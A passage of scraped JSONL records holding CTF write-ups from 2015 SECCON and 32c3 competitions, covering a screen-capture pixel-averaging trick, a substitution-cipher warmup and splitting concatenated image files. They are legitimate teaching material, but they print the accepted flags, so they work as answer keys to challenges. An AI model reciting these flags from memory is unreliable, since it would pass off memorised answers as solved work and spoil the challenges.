Process.GetProcessesByName(procName)[0];\n    var rect = new User32.Rect();\n    User32.GetWindowRect(proc.MainWindowHandle, ref rect);\n\n    int width = rect.right - rect.left;\n    int height = rect.bottom - rect.top;\n\n    var bmp = new Bitmap(width, height, PixelFormat.Format32bppArgb);\n    Graphics graphics = Graphics.FromImage(bmp);\n    graphics.CopyFromScreen(rect.left, rect.top, 0, 0, new Size(width, height), CopyPixelOperation.SourceCopy);\n\n    bmp.Save(\"frame\" + i + \".png\", ImageFormat.Png);\n}\n\nprotected override void OnLoad(EventArgs e) {\n    int i = 0;\n    while (true) {\n        i++;\n        CaptureApplication(\"firefox\", i);\n        Thread.Sleep(100);\n    }\n    base.OnLoad(e);\n}\n```\n\nAnd then tiny script to average every pixel and save result (to be honest, we just stole it from SO):\n\n```python\nimport os, numpy, PIL\nfrom PIL import Image\n\n# Access all PNG files in directory\nallfiles=os.listdir(os.getcwd())\nimlist=[filename for filename in allfiles if  filename[-4:] in [\".png\",\".PNG\"]]\n\n# Assuming all images are the same size, get dimensions of first image\nw,h=Image.open(imlist[0]).size\nN=len(imlist)\n\n# Create a numpy array of floats to store the average (assume RGB images)\narr=numpy.zeros((h,w,3),numpy.float)\n\n# Build up average pixel intensities, casting each image as an array of floats\nfor im in imlist:\n    imarr=numpy.array(Image.open(im).convert(\"RGB\"),dtype=numpy.float)\n    arr=arr+imarr/N\n\n# Round values in array and cast as 8-bit integer\narr=numpy.array(numpy.round(arr),dtype=numpy.uint8)\n\n# Generate, save and preview final image\nout=Image.fromarray(arr,mode=\"RGB\")\nout.save(\"Average.png\")\nout.show()\n```\n\nAnd the result is:\n\n![](Average.png)\n\nAfter improving contrast and decoding QR CODE:\n\n    SECCON{TH3F0RC3AVVAK3N53P7}\n", "timestamp": "2025-10-21T22:03:26.800476"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-12-05-seccon/start_seccon_50/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-12-05-seccon/start_seccon_50/README.md", "content": "## Start SECCON CTF (Exercise, 50p)\n\n    ex1\n    Cipher:PXFR}QIVTMSZCNDKUWAGJB{LHYEO\n    Plain: ABCDEFGHIJKLMNOPQRSTUVWXYZ{}\n\n    ex2\n    Cipher:EV}ZZD{DWZRA}FFDNFGQO\n    Plain: {HELLOWORLDSECCONCTF}\n\n    quiz\n    Cipher:A}FFDNEVPFSGV}KZPN}GO\n    Plain: ?????????????????????\n\n\n###PL\n[ENG](#eng-version)\n\nBardzo proste rozgrzewkowe zadanie. Szyfr który widać że jeden wejścia zawsze odpowiada takiemu samemu znaku wyjścia.\n\nFlaga:\n\n    SECCON{HACKTHEPLANET}\n\nRozwiązanie - zdekodowaliśmy ciphertext po prostu ręcznie.\n\n### ENG version\n\nVery easy exercise. It's obvious that in given cipher each ciphertext character is always decoded to the same character.\n\nFlag:\n\n    SECCON{HACKTHEPLANET}\n\nSolution - we just did the decoding by hand.\n", "timestamp": "2025-10-21T22:03:27.055205"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-12-05-seccon/stegano_1_100/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-12-05-seccon/stegano_1_100/README.md", "content": "## Steganography 1 (Stegano, 100p)\n\n    Find image files in the file\n    ![](MrFusion.gpjb)\n    Please input flag like this format-->SECCON{*** ** **** ****}\n\n###PL\n[ENG](#eng-version)\n\nDostajemy plik o rozszerzeniu .gpjb. Polecenie `file` rozpoznaje go jako gif:\n\n![](out.0.gif)\n\nAle po otworzeniu tego pliku w hexedytorze okazuje się że plik ten składa się w rzeczywistości z dużej liczby obrazów sklejonych w jeden.\nDomyślamy się że \"gpjb\" pochodzi od rozszerzeń .gif, .png, .jpg oraz .bmp.\n\nPiszemy na szybko skrypt w pythonie który dzieli te pliki na fragmenty (szukając odpowiednich headerów formatów):\n\n```python\nimport re\n\ndata = open('MrFusion.gpjb', 'rb').read()\n\ndef findndx(str, data):\n    return [m.start() for m in re.finditer(str, data)]\n\next = {\n    '.gif': 'GIF89a',\n    '.png': '\\x89PNG',\n    '.bmp': 'BM',\n    '.jpg': '\\xFF\\xD8\\xFF\\xE0'\n}\n\nfor ext, pat in ext.iteritems():\n    for n in findndx(pat, data):\n        open('out.' + str(n) + ext, 'wb').write(data[n:])\n```\n\nNastępnie uruchamiamy go i otrzymujemy sporo obrazów, z których każdy odpowiada jednemu znakowi:\n\n![](folder.png)\n\nPo przepisaniu:\n\n    SECCON{OCT2120150728}\n\nZ powodu błedu w zadaniu flaga nie przechodziła sprawdzenia, więc do opisu zadania doszła informacja o wymaganym formacie flagi, więc ostateczna flaga:\n\n    SECCON{OCT 21 2015 0728}\n\n\n### ENG version\n\nWe are given a file with .gpjb extension. `File` command recognises it as a gif:\n\n![](out.0.gif)\n\nBut after checking the file in hexeditor it turns out that the file is composed of large number of concantenated images.\nWe guess that \"gpjb\" extension stands for gif, png, jpg and bmp file formats.\n\nWe have written quick and dirty script to split file into fragments (according to format headers):\n\n```python\nimport re\n\ndata = open('MrFusion.gpjb', 'rb').read()\n\ndef findndx(str, data):\n    return [m.start() for m in re.finditer(str, data)]\n\next = {\n    '.gif': 'GIF89a',\n    '.png': '\\x89PNG',\n    '.bmp': 'BM',\n    '.jpg': '\\xFF\\xD8\\xFF\\xE0'\n}\n\nfor ext, pat in ext.iteritems():\n    for n in findndx(pat, data):\n        open('out.' + str(n) + ext, 'wb').write(data[n:])\n```\n\nAfter execution, script generated a lot of images, each of which represented single flag character:\n\n![](folder.png)\n\nAfter rewrite:\n\n    SECCON{OCT2120150728}\n\nBut because of bug in challenge checker, flag was not accepted by server. After that, description of challenge was changed, and final, accepted flag is:\n\n    SECCON{OCT 21 2015 0728}\n", "timestamp": "2025-10-21T22:03:27.304381"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-12-27-32c3/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-12-27-32c3/README.md", "content": "# Writeup 32c3 CTF 2015\n\nUczestniczyliśmy (cr019283, c7f.m0d3, mnmd21891, msm, Rev, other019, nazywam i Shalom) w 32c3 CTF 2015, i znowu spróbujemy opisać zadania z którymi walczyliśmy (a przynajmniej te, które pokonaliśmy).\n\n### Spis treści:\n* [Forth (Pwn) 150](forth_pwn_150)\n* [Teufel (Pwn) 200](teufel_pwn_200)\n* [HD44780 (Embedded) 150](hd44780_embedded_150)\n* [TinyHosting (Web) 250](tiny_hosting_web_250)\n* [Gurke (Misc) 300](gurke_misc_300)\n\n", "timestamp": "2025-10-21T22:03:27.919308"}
